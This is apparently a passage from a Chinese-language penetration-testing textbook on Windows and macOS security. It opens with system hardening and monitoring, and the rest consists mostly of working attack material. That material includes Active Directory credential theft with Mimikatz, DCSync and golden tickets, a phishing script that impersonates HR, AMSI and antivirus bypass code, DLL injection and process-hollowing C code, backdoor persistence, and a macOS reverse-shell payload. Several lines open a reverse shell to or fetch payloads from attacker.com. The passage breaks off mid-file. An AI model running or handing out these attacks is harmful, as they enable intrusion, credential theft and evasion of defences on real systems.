1. 重启Mac，按住Command+R进入恢复模式
2. 打开终端
3. 执行：`csrutil disable`
4. 重启

**启用SIP**：
1. 进入恢复模式
2. 执行：`csrutil enable`
3. 重启

#### 2.2.2 Gatekeeper管理

**查看状态**：
```bash
spctl --status
```

**启用Gatekeeper**：
```bash
sudo spctl --master-enable
```

**禁用Gatekeeper**：
```bash
sudo spctl --master-disable
```

**添加开发者到白名单**：
```bash
spctl --add --label "Approved" /Applications/MyApp.app
```

#### 2.2.3 防火墙配置

**应用防火墙**：
```bash
# 启用防火墙
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on

# 禁用防火墙
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off

# 启用隐蔽模式
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on

# 阻止特定应用
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /Applications/MyApp.app
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --block /Applications/MyApp.app
```

**pf防火墙**：
```bash
# 查看pf状态
sudo pfctl -s info

# 启用pf
sudo pfctl -e

# 加载规则
sudo pfctl -f /etc/pf.conf

# 查看规则
sudo pfctl -s rules
```

### 2.3 macOS钥匙串安全

#### 2.3.1 钥匙串管理

**查看钥匙串**：
```bash
# 列出钥匙串
security list-keychains

# 默认钥匙串
security default-keychain

# 钥匙串内容
security dump-keychain -a ~/Library/Keychains/login.keychain-db
```

**证书管理**：
```bash
# 查找证书
security find-certificate -a -p /Library/Keychains/System.keychain

# 添加证书
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain certificate.pem

# 删除证书
sudo security delete-certificate -c "Certificate Name"
```

#### 2.3.2 钥匙串攻击技术

**提取钥匙串数据**：
```bash
# 使用security命令
security find-generic-password -s "service_name" -w
security find-internet-password -s "server" -w

# 导出钥匙串
security export -k ~/Library/Keychains/login.keychain-db -t certs -f pemseq -w
```

**钥匙串密码破解**：
- 使用chainbreaker工具
- 使用John the Ripper
- 使用hashcat

### 2.4 macOS隐私和安全

#### 2.4.1 TCC数据库管理

**查看TCC权限**：
```bash
# 用户TCC数据库
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

# 系统TCC数据库（需要SIP禁用）
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"
```

**重置TCC权限**：
```bash
# 重置特定应用的权限
tccutil reset All com.example.app

# 重置所有权限
tccutil reset All
```

#### 2.4.2 隐私设置管理

**位置服务**：
```bash
# 查看位置服务状态
defaults read /var/db/locationd/clients.plist

# 禁用位置服务
sudo defaults write /var/db/locationd/clients.plist "com.example.app" -bool false
```

**摄像头和麦克风**：
```bash
# 查看访问过摄像头的进程
log show --predicate 'subsystem == "com.apple.TCC"' --info

# 监控摄像头访问
sudo fs_usage | grep "VDCAssistant"
```

### 2.5 macOS网络监控

#### 2.5.1 网络连接监控

**查看网络连接**：
```bash
# 活动连接
netstat -an
lsof -i

# 特定端口
lsof -i :80
lsof -i :443

# 特定进程
lsof -p PID -i
```

**网络流量分析**：
```bash
# 使用tcpdump
sudo tcpdump -i en0 -w capture.pcap
sudo tcpdump -i en0 port 80

# 使用nettop
nettop -m tcp
nettop -p PID
```

#### 2.5.2 DNS监控

**DNS查询监控**：
```bash
# 查看DNS缓存
sudo killall -INFO mDNSResponder

# 清除DNS缓存
sudo killall -HUP mDNSResponder

# 查看DNS配置
scutil --dns
```

**DNS安全**：
```bash
# 使用DNS-over-HTTPS
networksetup -setdnsservers "Wi-Fi" 1.1.1.1 8.8.8.8

# 验证DNSSEC
dig +dnssec example.com
```

***
## 三、跨平台安全工具

### 3.1 Sysinternals工具集（Windows）

#### 3.1.1 核心工具

**Process Explorer**：
- 增强版任务管理器
- 查看进程详细信息
- 检测DLL注入
- 查看句柄和加载的DLL

**Process Monitor**：
- 实时监控文件、注册表、网络、进程活动
- 强大的过滤功能
- 事件分析工具

**Autoruns**：
- 查看所有自启动位置
- 检测持久化机制
- 验证签名状态

**AccessChk**：
- 检查对象权限
- 枚举用户权限
- 审核安全配置

#### 3.1.2 使用示例

```cmd
:: 使用AccessChk检查服务权限
accesschk.exe -c * -w

:: 使用PsExec远程执行
psexec.exe \\DC01 -u domain\user -p password cmd.exe

:: 使用ProcDump转储LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### 3.2 macOS安全工具

#### 3.2.1 内置工具

**dtruss**：
- 系统调用跟踪
- 类似于Linux的strace

**fs_usage**：
- 文件系统活动监控
- 实时显示文件操作

**opensnoop**：
- 监控文件打开操作
- 使用DTrace框架

#### 3.2.2 第三方工具

**KnockKnock**：
- 查看持久化项目
- 检测可疑启动项

**BlockBlock**：
- 监控持久化安装
- 实时警报

**RansomWhere?**：
- 检测勒索软件活动
- 监控文件加密行为

**Little Snitch**：
- 网络连接监控
- 应用程序防火墙
- 流量过滤

### 3.3 跨平台渗透工具

#### 3.3.1 Metasploit Framework

**Windows模块**：
```ruby
# 常用Windows模块
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/psexec
use post/windows/gather/credentials/credential_collector
use post/windows/manage/migrate
```

**macOS模块**：
```ruby
# 常用macOS模块
use exploit/osx/browser/safari_file_policy
use post/osx/gather/enum_adium
use post/osx/gather/enum_chrome
use post/osx/gather/enum_keychain
```

#### 3.3.2 Impacket工具集

**Windows域渗透**：
```bash
# psexec风格远程执行
impacket-psexec domain/user:password@target

# wmiexec远程执行
impacket-wmiexec domain/user:password@target

# dcsync获取哈希
impacket-secretsdump domain/user:password@target

# kerberoasting
impacket-GetUserSPNs domain/user:password -request
```

***
## 四、安全监控与检测

### 4.1 Windows安全监控

#### 4.1.1 Sysmon配置

**安装和配置**：
```cmd
:: 安装Sysmon
sysmon64.exe -accepteula -i sysmonconfig.xml

:: 更新配置
sysmon64.exe -c sysmonconfig.xml
```

**关键事件类型**：
- Event 1：进程创建
- Event 3：网络连接
- Event 7：映像加载
- Event 8：远程线程创建
- Event 10：进程访问
- Event 11：文件创建
- Event 12-14：注册表事件
- Event 15：文件流创建
- Event 22：DNS查询

#### 4.1.2 Windows事件转发

**配置事件转发**：
1. 配置源计算机（订阅者）
2. 配置事件收集器（源）
3. 创建订阅
4. 验证连接

**优势**：
- 集中日志管理
- 减少本地存储需求
- 实时监控能力

### 4.2 macOS安全监控

#### 4.2.1 Endpoint Security Framework

**监控能力**：
- 进程执行
- 文件系统事件
- 网络事件
- 内核事件

**实现方式**：
- 系统扩展（System Extension）
- 需要用户批准
- 沙盒化运行

#### 4.2.2 osquery

**安装和使用**：
```bash
# 安装osquery
brew install osquery

# 交互式查询
osqueryi

# 查询示例
SELECT * FROM processes WHERE name = 'bash';
SELECT * FROM users WHERE username != '';
SELECT * FROM listening_ports;
SELECT * FROM chrome_extensions;
```

**常见查询**：
```sql
-- 查找可疑进程
SELECT pid, name, path, cmdline FROM processes 
WHERE path NOT IN ('/usr/bin/*', '/usr/sbin/*', '/usr/local/bin/*');

-- 查找网络连接
SELECT pid, fd, socket, local_address, remote_address, state 
FROM process_open_sockets WHERE remote_address != '';

-- 查找自启动项
SELECT * FROM startup_items;
SELECT * FROM launchd;
```

***
## 五、高级技巧

### 5.1 Windows高级技巧

#### 5.1.1 内存取证

**使用WinPmem**：
```cmd
:: 转储物理内存
winpmem_mini_x64.exe memory.raw

:: 使用Volatility分析
volatility -f memory.raw imageinfo
volatility -f memory.raw --profile=Win7SP1x64 pslist
volatility -f memory.raw --profile=Win7SP1x64 hashdump
```

#### 5.1.2 凭证提取

**Mimikatz高级用法**：
```cmd
:: 提取所有凭据
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

:: DCSync攻击
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

:: 票据操作
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /ptt
```

#### 5.1.3 横向移动

**Pass-the-Hash**：
```cmd
:: 使用Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:hash

:: 使用Impacket
impacket-psexec -hashes :hash Administrator@target
```

**Overpass-the-Hash**：
```cmd
:: 使用Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:hash /run:cmd.exe
```

### 5.2 macOS高级技巧

#### 5.2.1 持久化技术

**Login Items**：
```bash
# 添加登录项
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/app", hidden:false}'
```

**Launch Agents/Daemons**：
```bash
# 创建Launch Agent
cat > ~/Library/LaunchAgents/com.example.agent.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/path/to/script.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# 加载
launchctl load ~/Library/LaunchAgents/com.example.agent.plist
```

#### 5.2.2 权限提升

**sudo缓存利用**：
```bash
# 检查sudo超时
sudo -V

# 利用sudo缓存
sudo -n command  # 非交互式尝试
```

**Authorization Services**：
```bash
# 使用osascript提权
osascript -e 'do shell script "whoami" with administrator privileges'
```

#### 2.2.3 绕过安全机制

**绕过Gatekeeper**：
```bash
# 移除隔离属性
xattr -d com.apple.quarantine /path/to/app.app

# 使用已签名的加载器
codesign -dvvv /path/to/app.app
```

**绕过TCC**：
```bash
# 利用已授权应用
# 通过AppleScript控制已授权应用
osascript -e 'tell application "Finder" to make new folder at desktop'
```

通过掌握这些核心技巧，安全从业者能够有效地进行Windows和macOS系统的安全测试、监控和防护。这些技巧涵盖了从基础信息收集到高级权限提升的各个方面，是实际工作中的重要工具。

***
# 第07章 操作系统基础——Windows与macOS

# 03 实战案例

## 一、Windows域环境渗透实战

### 1.1 场景描述

**目标环境**：
- 企业Active Directory域环境
- 域控制器：Windows Server 2019
- 域成员：Windows 10/11工作站
- 网络：10.10.10.0/24

**攻击目标**：
- 从普通域用户提升到域管理员
- 获取域控制器完全控制权
- 提取所有域用户凭据

### 1.2 信息收集阶段

#### 1.2.1 域环境枚举

**使用PowerView**：
```powershell
# 导入PowerView
Import-Module .\PowerView.ps1

# 获取域信息
Get-Domain
Get-DomainController

# 枚举域用户
Get-DomainUser | Select-Object samaccountname, description, memberof

# 枚举域组
Get-DomainGroup | Select-Object samaccountname, memberof

# 枚举域管理员
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 枚举服务账户（SPN）
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

**使用BloodHound**：
```bash
# 收集数据
python3 bloodhound.py -u user -p password -d domain.local -dc dc.domain.local -c All

# 导入Neo4j
neo4j console

# 分析攻击路径
# 使用BloodHound GUI查看最短路径到Domain Admin
```

#### 1.2.2 网络扫描

**使用Nmap**：
```bash
# 快速扫描
nmap -sS -sV -O 10.10.10.0/24

# 扫描常见端口
nmap -p 88,135,139,389,445,636,3268,3269,5985,5986 10.10.10.0/24

# 扫描域控制器
nmap -sS -sV -p 88,389,636,3268,3269 dc.domain.local
```

### 1.3 凭据获取阶段

#### 1.3.1 钓鱼攻击

**制作恶意文档**：
```powershell
# 使用MacroPack生成恶意宏
python macro_pack.py -e CMD -g demo.doc -o

# 或者使用Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f vba-psh
```

**钓鱼邮件发送**：
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# 构造钓鱼邮件
msg = MIMEMultipart()
msg['From'] = 'hr@company.com'
msg['To'] = 'target@company.com'
msg['Subject'] = 'Important: Salary Review Document'

body = '''
Dear Employee,

Please find attached the salary review document for your review.

Best regards,
HR Department
'''

msg.attach(MIMEText(body, 'plain'))

# 附件
with open('demo.doc', 'rb') as f:
    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(f.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 'attachment', filename='salary_review.doc')
    msg.attach(attachment)

# 发送
server = smtplib.SMTP('mail.company.com', 587)
server.starttls()
server.login('user', 'password')
server.send_message(msg)
server.quit()
```

#### 1.3.2 漏洞利用

**永恒之蓝（MS17-010）**：
```bash
# 使用Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.100
set LHOST 10.10.10.1
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

**PrintNightmare（CVE-2021-34527）**：
```bash
# 使用Exploit
python3 CVE-2021-34527.py -target 10.10.10.100 -username user -password password -domain domain.local -dll payload.dll
```

### 1.4 权限提升阶段

#### 1.4.1 本地权限提升

**UAC绕过**：
```powershell
# 使用Fodhelper绕过UAC
$regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "fodhelper.exe"
```

**服务权限提升**：
```powershell
# 检查可写服务
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 

# 修改服务配置
sc config VulnerableService binpath= "cmd /c net user hacker Password123! /add"
sc stop VulnerableService
sc start VulnerableService
```

#### 1.4.2 域权限提升

**Kerberoasting**：
```powershell
# 使用Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt

# 使用Impacket
impacket-GetUserSPNs domain.local/user:password -request -outputfile hashes.txt

# 使用hashcat破解
hashcat -m 13100 hashes.txt wordlist.txt
```

**AS-REP Roasting**：
```powershell
# 使用Rubeus
Rubeus.exe asreproast /outfile:asrep.txt

# 使用Impacket
impacket-GetNPUsers domain.local/user:password -request -format hashcat -outputfile asrep.txt

# 使用hashcat破解
hashcat -m 18200 asrep.txt wordlist.txt
```

### 1.5 横向移动阶段

#### 1.5.1 Pass-the-Hash

**使用Mimikatz**：
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

**使用Impacket**：
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.100
```

#### 1.5.2 Pass-the-Ticket

**使用Rubeus**：
```cmd
# 请求TGT
Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:e0fb1fb85756c24235ff238cbe81fe00 /ptt

# 或者注入票据
Rubeus.exe ptt /ticket:ticket.kirbi
```

**使用Mimikatz**：
```cmd
mimikatz # kerberos::ptt ticket.kirbi
```

### 1.6 域控制器攻击

#### 1.6.1 DCSync攻击

**使用Mimikatz**：
```cmd
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

**使用Impacket**：
```bash
impacket-secretsdump domain.local/Administrator:password@dc.domain.local
```

#### 1.6.2 黄金票据攻击

**创建黄金票据**：
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:ntlm_hash /ptt
```

**使用黄金票据**：
```cmd
dir \\dc.domain.local\c$
psexec.exe \\dc.domain.local cmd.exe
```

### 1.7 凭据提取

#### 1.7.1 LSASS内存转储

**使用Mimikatz**：
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**使用Procdump**：
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**离线提取**：
```bash
# 使用pypykatz
pypykatz lsa minidump lsass.dmp
```

#### 1.7.2 NTDS.dit提取

**使用VSS**：
```cmd
# 创建卷影副本
vssadmin create shadow /for=C:

# 复制NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# 复制SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

**使用secretsdump**：
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

***
## 二、macOS权限提升实战

### 2.1 场景描述

**目标环境**：
- macOS工作站
- 当前用户：普通用户
- 目标：获取root权限

### 2.2 信息收集

#### 2.2.1 系统信息

```bash
# 系统版本
sw_vers

# SIP状态
csrutil status

# 用户信息
id
dscl . list /Users

# 已安装软件
ls /Applications
system_profiler SPApplicationsDataType
```

#### 2.2.2 安全配置检查

```bash
# Gatekeeper状态
spctl --status

# FileVault状态
fdesetup status

# 防火墙状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# 检查sudo权限
sudo -l
```

### 2.3 漏洞利用

#### 2.3.1 sudo漏洞利用

**CVE-2021-3156（Baron Samedit）**：
```bash
# 检查sudo版本
sudo --version

# 利用漏洞
# 下载PoC
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make

# 执行
./sudo-hax-me-a-sandwich
```

#### 2.3.2 内核漏洞利用

**检查内核版本**：
```bash
uname -r
sysctl kern.version
```

**使用内核漏洞**：
```bash
# 下载漏洞利用代码
# 编译
gcc -o exploit exploit.c

# 执行
./exploit
```

### 2.4 配置错误利用

#### 2.4.1 sudo配置错误

**检查sudoers文件**：
```bash
sudo -l

# 如果看到类似这样的配置：
# (ALL) NOPASSWD: /usr/bin/vim
# 可以这样利用：
sudo vim -c ':!/bin/bash'
```

**常见sudo滥用**：
```bash
# 如果有perl权限
sudo perl -e 'exec "/bin/bash";'

# 如果有python权限
sudo python -c 'import pty;pty.spawn("/bin/bash")'

# 如果有less/more权限
sudo less /etc/shadow
# 在less中输入 !bash

# 如果有awk权限
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### 2.4.2 文件权限错误

**检查SUID文件**：
```bash
find / -perm -4000 -type f 2>/dev/null

# 如果发现可写的SUID文件
# 替换为恶意版本
```

**检查可写目录**：
```bash
find / -writable -type d 2>/dev/null

# 如果PATH中的目录可写
# 植入恶意程序
```

### 2.5 持久化技术

#### 2.5.1 登录项持久化

**使用AppleScript**：
```bash
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/backdoor", hidden:true}'
```

**手动添加**：
```bash
# 复制到启动目录
cp backdoor ~/Library/LaunchAgents/com.example.backdoor.plist
```

#### 2.5.2 Launch Agent持久化

**创建Launch Agent**：
```bash
cat > ~/Library/LaunchAgents/com.example.backdoor.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.backdoor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
```

**加载Agent**：
```bash
launchctl load ~/Library/LaunchAgents/com.example.backdoor.plist
```

***
## 三、Windows免杀与对抗实战

### 3.1 场景描述

**目标**：
- 绕过Windows Defender检测
- 绕过AMSI防护
- 实现持久化控制

### 3.2 Payload生成

#### 3.2.1 使用msfvenom

**基础Payload**：
```bash
# 生成exe payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe

# 生成dll payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f dll -o payload.dll

# 生成powershell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f psh -o payload.ps1
```

**编码Payload**：
```bash
# 使用编码器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe

# 使用多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 | msfvenom -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe
```

#### 3.2.2 使用Cobalt Strike

**生成Beacon**：
```text
Attacks -> Packages -> Windows Executable (S)
Payload: Beacon HTTP
Listener: HTTP
Output: Windows EXE
```

**使用Artifact Kit**：
```bash
# 编译自定义Artifact
cd /opt/cobaltstrike/artifact-kit
./build.sh
```

### 3.3 AMSI绕过

#### 3.3.1 常见绕过方法

**内存补丁**：
```powershell
# 绕过AMSI初始化
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};[IntPtr]$c=$b.GetValue($null);[Int32[]]$d=@(0);[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)
```

**反射加载**：
```powershell
# 使用反射加载绕过
$data = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($data)
$entry = $assembly.EntryPoint
$entry.Invoke($null, (,$args))
```

#### 3.3.2 自定义绕过

**使用PowerSploit**：
```powershell
# 下载Invoke-AMSIBypass
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-AMSIBypass.ps1')

# 执行绕过
Invoke-AMSIBypass
```

**使用amsi.dll补丁**：
```powershell
# 获取amsi.dll地址
$amsi = [System.Reflection.Assembly]::LoadFile('C:\Windows\System32\amsi.dll')
$amsiType = $amsi.GetType('AmsiUtils')
$field = $amsiType.GetField('amsiContext', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
$context = $field.GetValue($null)

# 修改内存保护
$oldProtect = 0
$kernel32 = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);' -Name 'Kernel32' -Namespace 'Win32' -PassThru
$kernel32::VirtualProtect($context, 0x1000, 0x40, [ref]$oldProtect)

# 修改标志
[System.Runtime.InteropServices.Marshal]::WriteByte($context, 0, 0)
```

### 3.4 进程注入

#### 3.4.1 DLL注入

**使用Meterpreter**：
```meterpreter
# 迁移到其他进程
migrate PID

# 注入到指定进程
inject PID -t 32
```

**手动DLL注入**：
```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    DWORD pid = atoi(argv[1]);
    char *dllPath = argv[2];
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return 1;
    }
    
    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pDllPath == NULL) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        return 1;
    }
    
    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
    
    HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        return 1;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}
```

#### 3.4.2 进程镂空

**Process Hollowing**：
```c
#include <windows.h>
#include <winternl.h>

int main() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    // 创建挂起进程
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 获取线程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // 读取PEB
    PEB peb;
    ReadProcessMemory(pi.hProcess, (LPVOID)ctx.Rdx, &peb, sizeof(PEB), NULL);
    
    // 解除映射
    NtUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress);
    
    // 分配新内存
    LPVOID newBase = VirtualAllocEx(pi.hProcess, peb.ImageBaseAddress, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 写入新代码
    WriteProcessMemory(pi.hProcess, newBase, payload, payloadSize, NULL);
    
    // 更新PEB
    ctx.Rcx = (DWORD64)newBase + entryPoint;
    SetThreadContext(pi.hThread, &ctx);
    
    // 恢复执行
    ResumeThread(pi.hThread);
    
    return 0;
}
```

### 3.5 持久化技术

#### 3.5.1 注册表持久化

**添加启动项**：
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**使用WMI事件订阅**：
```powershell
# 创建事件过滤器
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "BackdoorFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
}

# 创建消费者
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = "BackdoorConsumer"
    CommandLineTemplate = "C:\Users\Public\backdoor.exe"
}

# 绑定
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### 3.5.2 计划任务

**使用schtasks**：
```cmd
schtasks /create /tn "Backdoor" /tr "C:\Users\Public\backdoor.exe" /sc onlogon /ru SYSTEM
```

**使用PowerShell**：
```powershell
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -User "SYSTEM"
```

***
## 四、macOS免杀与对抗实战

### 4.1 场景描述

**目标**：
- 绕过Gatekeeper
- 绕过XProtect
- 实现隐蔽控制

### 4.2 Payload生成

#### 4.2.1 使用msfvenom

**生成macOS Payload**：
```bash
# 生成Mach-O payload
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f macho -o payload

# 生成shell payload
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f macho -o shell
```

**使用Cobalt Strike**：
```yaml
Attacks -> Packages -> macOS Application
Listener: HTTP
Output: macOS Application
```

#### 4.2.2 自定义Payload

**编译Mach-O**：
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    server_addr.sin_addr.s_addr = inet_addr("10.10.10.1");
    
    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execve("/bin/bash", NULL, NULL);
    
    return 0;
}
```

### 4.3 Gatekeeper绕过

#### 4.3.1 移除隔离属性

```bash
# 移除隔离属性
xattr -d com.apple.quarantine payload.app

# 或者使用xattr -r递归
xattr -r -d com.apple.quarantine payload.app
```

#### 4.3.2 使用合法签名

**使用开发者证书**：
```bash
# 签名应用
codesign --force --sign "Developer ID Application: Your Name" payload.app

# 验证签名
codesign -dvvv payload.app
```

**使用ad-hoc签名**：
```bash
# Ad-hoc签名
codesign --force --sign - payload.app
```

#### 4.3.3 使用已签名的加载器

**创建加载器脚本**：
```bash
#!/bin/bash
# 这个脚本使用已签名的bash执行payload
curl -o /tmp/payload http://attacker.com/payload
chmod +x /tmp/payload
/tmp/payload &
```

**签名脚本**：
```bash
codesign --force --sign - loader.sh
```

### 4.4 XProtect绕过

#### 4.4.1 代码混淆

**使用Mach-O混淆器**：
```bash
# 使用自定义编译选项
gcc -o payload payload.c -Wl,-export_dynamic -Wl,-pie

# 使用UPX
upx --best payload
```

**使用Objective-C特性**：
```objective-c
// 使用运行时特性绕过静态分析
#import <objc/runtime.h>

void executePayload() {
    Class cls = objc_getClass("NSTask");
    SEL sel = @selector(launch);
    
    id task = [[cls alloc] init];
    [task setLaunchPath:@"/bin/bash"];
    [task setArguments:@[@"-c", @"payload_command"]];
    
    objc_msgSend(task, sel);
}
```

#### 4.4.2 动态加载

**使用dylib注入**：
```bash
# 编译动态库
gcc -dynamiclib -o payload.dylib payload.c

# 使用DYLD_INSERT_LIBRARIES
DYLD_INSERT_LIBRARIES=payload.dylib /Applications/Safari.app/Contents/MacOS/Safari
```

**使用脚本加载**：
```bash
#!/bin/bash
# 使用osascript执行
osascript -e 'do shell script "payload_command"'
```

### 4.5 持久化技术

#### 4.5.1 Login Items

```bash
# 使用AppleScript添加登录项
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/payload", hidden:true}'
```

#### 4.5.2 Launch Agent/Daemon

**创建Launch Agent**：
```bash
cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
